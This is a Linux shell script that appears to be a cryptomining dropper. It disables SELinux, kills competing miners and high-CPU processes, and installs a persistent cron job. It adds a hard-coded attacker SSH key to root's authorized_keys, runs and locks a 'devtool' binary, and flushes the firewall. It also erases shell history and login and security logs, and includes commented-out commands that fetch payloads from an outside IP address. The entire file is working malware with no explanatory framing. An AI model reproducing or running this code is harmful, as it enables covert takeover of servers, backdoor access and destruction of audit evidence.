#!/bin/sh
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/devtools
rtdir="/etc/devtools"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/url"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/get"
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/curl /usr/bin/url
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
ps ax|grep -o './[0-9]* -c'| xargs pkill -f
pkill -f biosetjenkins
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f mgwsl
pkill -f pythno
pkill -f jweri
pkill -f lx26
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f polkitd
pkill -f nanoWatch
pkill -f zigw
crontab -r
ps axf -o "pid"|while read procid
do
        ls -l /proc/$procid/exe | grep /tmp
        if [ $? -ne 1 ]
        then
                cat /proc/$procid/cmdline| grep -a -E "devtool|update.sh"
                if [ $? -ne 0 ]
                then
                        kill -9 $procid
                else
                        echo "don't kill"
                fi
        fi
done
ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
do
        cat /proc/$procid/cmdline| grep -a -E "devtool|update.sh"
        if [ $? -ne 0 ]
        then
                kill -9 $procid
        else
                echo "don't kill"
        fi
done



if [ -f "$rtdir" ]
    then
        echo "i am root"
        echo "goto 1" >> /etc/devtools
        chattr -i /etc/devtool*
        chattr -i /etc/config.json*
        chattr -i /etc/update.sh*
        chattr -i /root/.ssh/authorized_keys*
        [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/10 * * * * sh /etc/update.sh >/dev/null 2>&1") | crontab -
        chmod 700 /root/.ssh/
        echo >> /root/.ssh/authorized_keys
        chmod 600 root/.ssh/authorized_keys
        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDotlrjvr+IO+S3Jj7Hp2jPOCxx2hF2ldaE1HREwtyODC5//m7wCpYke9FdT4GZFEdUW+NotIw6ieYoCJ8Vp9LsNLU/7rvk6T8Wk+BjLb/eDY2nzE/0YN/q7X3+Ce1uMuupK7lAf80wQ2DVS16RMGidxVLgh1sViLpSKCws4Tyn/cgGmRI3+s3JraAKvypgSlgwR2rO44nXSpLfSPsK5kAimWdgLzIeNiRWoYS0V/O6JxzoORy+Vi+Agypb8dz676RYPm6l8ybBEvHFkC8u0+ilOOE2RS5OYO+tz7LrFBoTFZYzExktF8KcBFAy3IUGZQ8k2SDV3pcZ11oYbTPHqWzRPLPWLapd2pVsyUiYb0I2j6gl8Jr0um5KqZoG1cS0aC6EUVA0WfYEac1uFfAM62mIT0lLDgQHRk1/s74f9uOBC3dZsiE5uBCaakFYOJxRFQiYxH5GmV2n38THnh20Bq/7P3IpHGwHI+2fAFAF7uxYyqiFP5EG3fCrMtVE8fu3Fd0= jamy@iMac-von-jamy.local" >> /root/.ssh/authorized_keys
        rm /etc/devtool*
        rm /etc/config.json*
        rm /etc/update.sh*
		rm /root/.ssh/authorized_keys*
        cfg="/etc/config.json"
        file="/etc/devtool"
#        if [ -f "$bbdir" ]
#                        then
#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /etc/config.json
#                        elif [ -f "$bbdira" ]
#                        then
#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /etc/config.json
#                        elif [ -f "$ccdir" ]
#                        then
#                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
#                        elif [ -f "$ccdira" ]
#                        then
#                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
#        fi
#        if [ -f "$bbdir" ]
#                        then
#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /etc/devtool
#                        elif [ -f "$bbdira" ]
#                        then
#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /etc/devtool
#                        elif [ -f "$ccdir" ]
#                        then
#                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
#                        elif [ -f "$ccdira" ]
#                        then
#                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
#        fi
#        if [ -f "$bbdir" ]
#                        then
#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /etc/update.sh
#                        elif [ -f "$bbdira" ]
#                        then
#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /etc/update.sh
#                         elif [ -f "$ccdir" ]
#                        then
#                            wget --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
#                        elif [ -f "$ccdira" ]
#                        then
#                            get --timeout=10 --tries=100 -P /etc http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
#        fi
        chmod 777 /etc/devtool
        ps -fe|grep devtool |grep -v grep
        if [ $? -ne 0 ]
            then
                cd /etc
                echo "not root runing"
                sleep 5s
                ./devtool
        else
                echo "root runing....."
        fi
        chmod 777 /etc/devtool
        chattr +i /etc/devtool
        chmod 777 /etc/config.json
        chattr +i /etc/config.json
        chmod 777 /etc/update.sh
        chattr +i /etc/update.sh
        chmod 777 /root/.ssh/authorized_keys
        chattr +i /root/.ssh/authorized_keys
    else
        echo "goto 1" > /tmp/devtools
        chattr -i /tmp/devtool*
        chattr -i /tmp/config.json*
        chattr -i /tmp/update.sh*
        rm /tmp/devtool*
        rm /tmp/config.json*
        rm /tmp/update.sh*
        [[ $cont =~ "update.sh" ]] || (crontab -l ; echo "*/10 * * * * sh /tmp/update.sh >/dev/null 2>&1") | crontab -
#        if [ -f "$bbdir" ]
#                        then
#                            curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /tmp/config.json
#                        elif [ -f "$bbdira" ]
#                        then
#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json > /tmp/config.json
#                        elif [ -f "$ccdir" ]
#                        then
#                            wget --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
#                        elif [ -f "$ccdira" ]
#                        then
#                            get --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/config.json
#        fi
#        if [ -f "$bbdir" ]
#                        then
#                             curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /tmp/devtool
#                        elif [ -f "$bbdira" ]
#                        then
#                            url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool > /tmp/devtool
#                        elif [ -f "$ccdir" ]
#                        then
#                                    wget --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
#                                elif [ -f "$ccdira" ]
#                                then
#                                    get --timeout=10 --tries=100 -P /tmp http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/devtool
#        fi
#        if [ -f "$bbdir" ]
#            then
#                    curl --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /tmp/update.sh
#                elif [ -f "$bbdira" ]
#                then
#                    url --connect-timeout 10 --retry 100 http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh > /tmp/update.sh
#                elif [ -f "$ccdir" ]
#                then
#                    wget --timeout=10 --tries=100 -P /tmp  http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
#                elif [ -f "$ccdira" ]
#                then
#                    get --timeout=10 --tries=100 -P /tmp  http://45.76.122.92:8506/IOFoqIgyC0zmf2UR/update.sh
#        fi 
        ps -fe|grep devtool |grep -v grep
        if [ $? -ne 0 ]
            then
                echo "not tmp runing"
                cd /tmp
                chmod 777 devtool
                sleep 5s
                ./devtool
            else
                echo "tmp runing....."
        fi
        chmod 777 /tmp/devtool
        chattr +i /tmp/devtool
        chmod 777 /tmp/update.sh
        chattr +i /tmp/update.sh
        chmod 777 /tmp/config.json
        chattr +i /tmp/config.json
        
fi
iptables -F
iptables -X
iptables -A OUTPUT -p tcp --dport 3333 -j DROP
iptables -A OUTPUT -p tcp --dport 5555 -j DROP
iptables -A OUTPUT -p tcp --dport 7777 -j DROP
iptables -A OUTPUT -p tcp --dport 9999 -j DROP
service iptables reload
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
history -c
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
